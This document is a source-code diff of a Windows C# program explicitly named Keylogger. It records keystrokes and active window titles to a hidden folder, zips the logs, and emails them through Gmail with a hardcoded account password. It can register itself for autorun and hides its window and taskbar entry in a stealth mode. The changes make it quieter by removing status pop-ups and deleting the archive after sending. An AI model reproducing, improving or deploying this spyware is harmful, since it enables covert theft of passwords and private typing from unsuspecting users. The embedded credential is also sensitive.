@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Globalization;
 using System.IO;
 using System.Windows;
@@ -7,21 +8,31 @@ using System.Runtime.InteropServices;
 using System.Windows.Interop;
 using System.Windows.Threading;
 using System.Linq;
+using System.Net;
 using System.Net.Mail;
 using System.Net.NetworkInformation;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
-//using System.IO.Compression;
-
-
-
+using System.IO.Compression;
 
 namespace Keylogger
 {
-    /// <summary>
-    /// Логика взаимодействия для MainWindow.xaml
-    /// </summary>
+    public static class FileExtensions
+    {
+        public static IEnumerable<FileSystemInfo> AllFilesAndFolders(this DirectoryInfo dir)
+        {
+            foreach (var f in dir.GetFiles())
+                yield return f;
+            foreach (var d in dir.GetDirectories())
+            {
+                yield return d;
+                foreach (var o in AllFilesAndFolders(d))
+                    yield return o;
+            }
+        }
+    }
+
     public partial class MainWindow : Window
     {
         #region WinAPI
@@ -37,10 +48,12 @@ namespace Keylogger
         static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr processId);
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         public static extern int GetWindowText(int hWnd, StringBuilder text, int count);
-        
+
 
         #endregion
-        
+
+        #region Initialize
+
         DispatcherTimer timerScreen = new DispatcherTimer();
         DispatcherTimer timerMail = new DispatcherTimer();
 
@@ -51,7 +64,9 @@ namespace Keylogger
         string datatime = String.Empty;
         static string winTitle = String.Empty;
         private int nextline = 0;
-        
+
+        #endregion
+
         #region Language
 
         private CultureInfo _currentLanaguge;
@@ -83,13 +98,11 @@ namespace Keylogger
 
             timerScreen.Tick += new EventHandler(timerScreen_tick);
             timerScreen.Interval = new TimeSpan(0,0,1);
-            
 
             txtNumMail.Text = _numValueScreen.ToString();
 
             timerMail.Tick += new EventHandler(timerMail_tick);
             timerMail.Interval = new TimeSpan(0, 0, 1);
-            
 
             Task.Factory.StartNew(() =>
             {
@@ -107,9 +120,14 @@ namespace Keylogger
 
         private void CreateDir()
         {
-            if (!Directory.Exists(AutoRun.Path() + "\\System"))
+            //if (File.Exists(AutoRun.Path() + "System.zip"))
+            //{
+            //    File.Delete(AutoRun.Path() + "System.zip");
+            //    MessageBox.Show("ZIP DELETED");
+            //}
+        if (!Directory.Exists(AutoRun.Path + "\\System"))
             {
-                DirectoryInfo di = Directory.CreateDirectory(AutoRun.Path() + "\\System");
+                DirectoryInfo di = Directory.CreateDirectory(AutoRun.Path + "\\System");
             }
            
         }
@@ -124,7 +142,7 @@ namespace Keylogger
                     try
                     {
                         CreateDir();
-                        StreamWriter SW = new StreamWriter(AutoRun.Path()+"\\System\\" + "Key.txt", true);
+                        StreamWriter SW = new StreamWriter(AutoRun.Path+"\\System\\" + "Key.txt", true);
                         datatime = DateTime.Now.ToString();
                         SW.WriteLine();
                         SW.WriteLine(datatime + "\t" + winTitle);
@@ -248,7 +266,7 @@ namespace Keylogger
                 try
                 {
                     CreateDir();
-                    using (StreamWriter SW = new StreamWriter(AutoRun.Path()+"\\System\\" + "Key.txt", true))
+                    using (StreamWriter SW = new StreamWriter(AutoRun.Path+"\\System\\" + "Key.txt", true))
                     {
 
                         if (IsWindowChanged())
@@ -393,6 +411,7 @@ namespace Keylogger
             
 
             RegisterHotKey(_windowHandle, HOTKEY_ID, (uint)WindowsHotKey.Alt, (uint)WindowsHotKey.F12); //Alt + F12
+            //RegisterHotKey(_windowHandle, HOTKEY_ID, (uint)WindowsHotKey.Ctrl, (uint)WindowsHotKey.V);
         }
         //(uint)WindowsHotKey.Alt
         private IntPtr HwndHook(IntPtr hwnd, int msg, IntPtr wParam, IntPtr lParam, ref bool handled)
@@ -412,8 +431,11 @@ namespace Keylogger
                             if (vkey == (uint)WindowsHotKey.F12 )
                             {
                                 Application.Current.MainWindow.Visibility = Visibility.Visible;
-                               // timerScreen.Stop();
-                               // timerMail.Stop();
+                                
+                            }
+                            if (vkey == (uint) WindowsHotKey.V)
+                            {
+                                
                             }
                             handled = true;
                             break;
@@ -491,7 +513,7 @@ namespace Keylogger
                 return;
             }
 
-            if (!int.TryParse(txtNumScreen.Text, out _numValueScreen))
+            if (!Int32.TryParse(txtNumScreen.Text, out _numValueScreen))
                 txtNumScreen.Text = _numValueScreen.ToString();
         }
 
@@ -503,47 +525,18 @@ namespace Keylogger
 
         private void CreateZIP()
         {
-            using (Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile())
+            try
             {
-                try
-                {
-                    zip.AddDirectory(AutoRun.Path() + "\\System");
-                    zip.Save(AutoRun.Path() + "System.zip");
-                    MessageBox.Show("ZIP CREATED");
-                }
-                catch (Exception e)
-                {
-                    MessageBox.Show("Create EX\n" + e.ToString());
-                }
-                finally
-                {
-                    zip.Dispose();
-                }
+                ZipFile.CreateFromDirectory(AutoRun.Path + "\\System", AutoRun.Path + "System.zip", CompressionLevel.Optimal, false);
+
             }
-            //Thread thread = new Thread(t =>
-            //{
+            catch (IOException ex)
+            {
+                DeleteZIP();
+                ZipFile.CreateFromDirectory(AutoRun.Path + "\\System", AutoRun.Path + "System.zip", CompressionLevel.Optimal, false);
 
-            //    m.WaitOne();
-            //    try
-            //    {
-            //        Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile();
-            //        zip.AddDirectory(AutoRun.Path() + "\\System");
-            //        zip.Save(AutoRun.Path() + "System.zip");
-            //        zip.Dispose();
-            //        MessageBox.Show("ZIP CREATED");
-            //    }
-            //    catch (Exception e)
-            //    {
-            //        MessageBox.Show("Create EX\n" + e.ToString());
-            //    }
-            //    finally
-            //    {
-
-            //        m.ReleaseMutex();
-            //    }
-            //});
-            //thread.Start();
-
+            }
+            
         }
 
         private void InternetConnect()
@@ -560,33 +553,30 @@ namespace Keylogger
             {
                 CreateZIP();
                 SendMail();
+                DeleteZIP();
                 DeleteFile();
+
             }
 
         }
 
         private void DeleteZIP()
         {
-            foreach (string f in Directory.GetFiles(AutoRun.Path()))
-            {
-                if (f == AutoRun.Path() + "System.zip")
-                {
-                    File.Delete(f);
-                    MessageBox.Show("ZIP DELETED");
-                }
-            }
+            if(File.Exists(AutoRun.Path + "System.zip"))
+                File.Delete(AutoRun.Path + "System.zip");
+            
         }
 
         private void DeleteFile()
         {
             try
             {
-                DirectoryInfo dirInfo = new DirectoryInfo(AutoRun.Path() + "\\System\\");
+                DirectoryInfo dirInfo = new DirectoryInfo(AutoRun.Path + "\\System\\");
                 foreach (FileInfo f in dirInfo.GetFiles())
                 {
                     f.Delete();
                 }
-                MessageBox.Show("FOLDER CLEARED");
+                //MessageBox.Show("FOLDER CLEARED");
             }
             catch (Exception e)
             {
@@ -599,12 +589,13 @@ namespace Keylogger
         private void SendMail()
         {
             MailMessage mail = new MailMessage();
-            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
+            
             mail.From = new MailAddress("keyloggernazzim@gmail.com");
+            
 
             txtBoxMail.Dispatcher.Invoke(new Action(() =>
                 {
-                    if (!string.IsNullOrEmpty(txtBoxMail.Text))
+                    if (!String.IsNullOrEmpty(txtBoxMail.Text))
                     {
                         //if (txtBoxMail.Text.Contains('@') && txtBoxMail.Text.Contains('.'))
                             mail.To.Add(txtBoxMail.Text);
@@ -622,15 +613,23 @@ namespace Keylogger
             try
             {
 
-                Attachment attachment;
-                attachment = new Attachment(AutoRun.Path() + "System.zip");
-                mail.Attachments.Add(attachment);
+                using (Attachment attachment = new Attachment(AutoRun.Path + "System.zip"))
+                {
+                    using (SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com"))
+                    {
+                        mail.Attachments.Add(attachment);
 
-                SmtpServer.Port = 587;
-                SmtpServer.Credentials = new System.Net.NetworkCredential("keyloggernazzim@gmail.com", "keylogger32");
-                SmtpServer.EnableSsl = true;
-                SmtpServer.Send(mail);
-                MessageBox.Show("E-MAIL Sent");
+                        SmtpServer.Port = 587;
+                        SmtpServer.Credentials = new NetworkCredential("keyloggernazzim@gmail.com", "keylogger32");
+                        SmtpServer.EnableSsl = true;
+                        SmtpServer.Send(mail);
+                    }
+                    
+                }
+                mail.Dispose();
+                
+                //MessageBox.Show("E-MAIL Sent");
+
             }
             catch (Exception ex)
             {
@@ -647,9 +646,8 @@ namespace Keylogger
 
             if (_numValueMail >= 1)
             {
-                if (_numValueMail * 2 == timeMail)
+                if (_numValueMail * 60 == timeMail)
                 {
-                    DeleteZIP();//--------------
                     new Thread(() =>
                     {
                         m.WaitOne();
@@ -705,9 +703,14 @@ namespace Keylogger
                 return;
             }
 
-            if (!int.TryParse(txtNumMail.Text, out _numValueMail))
+            if (!Int32.TryParse(txtNumMail.Text, out _numValueMail))
                 txtNumMail.Text = _numValueMail.ToString();
         }
+
+        #endregion
+
+        #region BufferExchange
+
 
         #endregion
 
@@ -730,23 +733,25 @@ namespace Keylogger
             Properties.Settings.Default.txtNumTimerMailProp = txtNumMail.Text;
             Properties.Settings.Default.txtBoxMailProp = txtBoxMail.Text;
             //Properties.Settings.Default.timeScreenProp = timeScreen;
-           // Properties.Settings.Default.timeMailProp = timeMail;
+            // Properties.Settings.Default.timeMailProp = timeMail;
             Properties.Settings.Default.Save();
         }
 
         private void AutoRun_Check(object sender, RoutedEventArgs e)
      {
-         AutoRun.SetAutoRun(true, AutoRun.Path() + "Keylogger.exe"); 
+         AutoRun.SetAutoRun(true, AutoRun.Path + "Keylogger.exe"); 
      }
 
         private void AutoRun_UnChecked(object sender, RoutedEventArgs e) 
      {
-         AutoRun.SetAutoRun(false, AutoRun.Path() + "Keylogger.exe");
+         AutoRun.SetAutoRun(false, AutoRun.Path + "Keylogger.exe");
      }
 
         private void Stealth_Checked(object sender, RoutedEventArgs e)
         {
             Application.Current.MainWindow.Visibility = Visibility.Hidden;
+            // Hide();
+            ShowInTaskbar = false;
             KeysLoad();
             timerScreen.Start();
             timerMail.Start();
@@ -755,6 +760,7 @@ namespace Keylogger
         private void Stealth_Unchecked(object sender, RoutedEventArgs e)
         {
             Application.Current.MainWindow.Visibility = Visibility.Visible;
+            ShowInTaskbar = true;
             timerScreen.Stop();
             timerMail.Stop();
         }
@@ -763,6 +769,5 @@ namespace Keylogger
         {
 
         }
-        
     }
 }
